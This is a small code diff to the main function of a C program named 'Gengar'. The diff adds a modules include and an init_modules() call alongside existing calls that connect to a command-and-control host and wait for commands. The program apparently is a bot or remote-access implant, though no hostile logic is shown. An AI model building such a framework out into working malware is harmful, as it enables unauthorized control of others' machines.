@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include "commander.h"
 #include "cnc.h"
+#include "modules.h"
 #include "logger.h"
 
 int main(int argc, char *argv[])
@@ -15,5 +16,6 @@ int main(int argc, char *argv[])
 
     log_info("Gengar started.");
     init_cnc_conn(host);
+    init_modules();
     listen_for_cmds();
 }
